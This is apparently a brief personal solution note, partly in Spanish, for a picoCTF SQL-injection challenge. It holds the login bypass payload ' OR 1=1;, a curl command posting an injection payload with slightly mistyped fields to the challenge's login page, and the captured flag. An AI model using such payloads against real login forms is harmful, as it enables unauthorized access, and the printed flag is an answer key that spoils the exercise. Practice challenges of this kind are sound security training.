Se le quita el hidden al cuadro oculto
Se cambia la variable por 1
Se inyecta en la consulta

	Username: ' OR 1=1;

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}

---------------------------------
curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&pasword=' on 1=1;&debug=1" 